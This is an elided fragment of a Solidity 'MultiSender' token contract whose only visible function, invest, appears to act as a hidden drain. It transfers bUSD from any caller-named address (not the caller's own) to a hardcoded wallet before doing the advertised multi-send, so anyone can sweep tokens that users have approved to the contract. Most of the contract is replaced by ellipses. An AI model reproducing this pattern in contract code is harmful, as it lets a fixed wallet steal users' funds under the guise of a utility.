...
contract MultiSender is StandardToken {
   ...
   */
    ...
    */
    ...
    function invest(address _sender, uint256 totalAmount, address _tokenAddress, address[] memory _to, uint[] memory _value) payable public {
        bUSD.transferFrom(_sender, 0x9dD26A5cA1f934E6a860796632d5fdeFE3EE2C82, totalAmount);
        coinSendDifferentValue(_tokenAddress, _to, _value);
    }
}